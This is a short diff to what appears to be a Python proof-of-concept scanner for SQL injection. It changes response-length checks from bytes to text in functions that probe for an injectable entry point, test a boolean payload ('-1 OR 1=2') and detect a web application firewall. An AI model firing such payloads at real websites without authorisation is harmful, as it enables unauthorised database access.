@@ -38,7 +38,7 @@ def poc(url):
         r2 = requests.post(target, headers=headers, data=data_temp.replace('[P]', '-1 OR 1=2'))
     except:
         return False
-    if r1.status_code == r2.status_code == 200 and len(r1.content) != len(r2.content):
+    if r1.status_code == r2.status_code == 200 and len(r1.text) != len(r2.text):
         return True
     return False
 
@@ -54,7 +54,7 @@ def get_entry(url):
             r = requests.get(target, timeout=10)
         except:
             continue
-        if r.status_code == 200 and len(r.content) < 10:
+        if r.status_code == 200 and len(r.text) < 10:
             return target
     return None
 
@@ -66,6 +66,6 @@ def has_waf(target):
         r_waf = requests.get(target + check_waf_payload, timeout=3)
     except:
         return False
-    if len(r_waf.content) > 10 or r_waf.status_code != 200:
+    if len(r_waf.text) > 10 or r_waf.status_code != 200:
         return True
     return False
